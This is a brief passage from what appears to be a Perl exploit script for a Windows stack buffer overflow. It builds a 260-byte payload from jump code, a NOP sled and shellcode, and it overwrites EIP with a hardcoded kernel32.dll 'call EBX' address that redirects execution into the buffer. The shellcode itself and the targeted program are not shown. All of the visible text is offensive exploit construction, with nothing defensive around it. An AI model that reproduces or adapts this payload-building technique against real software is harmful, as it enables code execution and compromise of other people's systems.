...
my $nops = "\x90" x (260 - ((length($jmp) + length($shellcode))));
my $eip = pack('V',0x7c810395);  # call EBX from kernel32.dll which points to start of buffer and our jump code

my $sploit = $jmp.$nops.$shellcode.$eip;	    # build sploit version of buffer
